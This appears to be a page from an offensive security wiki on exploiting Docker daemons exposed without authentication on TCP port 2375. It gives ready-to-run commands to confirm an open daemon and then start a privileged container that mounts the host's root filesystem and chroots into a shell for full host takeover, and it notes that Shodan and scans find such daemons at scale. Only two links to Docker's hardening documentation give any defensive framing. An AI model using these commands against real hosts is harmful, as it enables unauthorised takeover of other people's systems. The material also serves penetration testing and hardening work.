---
title: "Unauthenticated daemon access: the plaintext Docker API on 2375"
description: "Reaching a Docker daemon exposed on the plaintext TCP port 2375, which requires no authentication, giving full control of the engine to list and run containers and take over the host."
keywords:
  - docker 2375
  - unauthenticated docker
  - docker remote API
  - exposed daemon
  - container takeover
---

# Unauthenticated daemon access

When the daemon is bound to `tcp://0.0.0.0:2375`, the API is served in plaintext with no authentication. Anyone who can reach the port controls the engine. It is a common misconfiguration on cloud hosts and CI runners.

```bash
# Find and confirm an open daemon
curl -s http://<host>:2375/version
docker -H tcp://<host>:2375 ps

# From here it is a full host takeover
docker -H tcp://<host>:2375 run -v /:/host --privileged -it alpine chroot /host sh
```

## Exploitation notes

- Shodan and simple scans find these at scale; `/version` and `/info` confirm an unauthenticated daemon.
- The takeover step is the same as any daemon access, covered in [Host takeover via privileged run](host-takeover-via-privileged-run.md).
- A daemon reached through a mounted socket rather than the network is the container-escape case [Runtime socket mount](../../../container-escape/sensitive-mounts/runtime-socket-mount.md).

## References

- [Docker: protect the daemon socket](https://docs.docker.com/engine/security/protect-access/)
- [Docker Engine API](https://docs.docker.com/engine/api/)
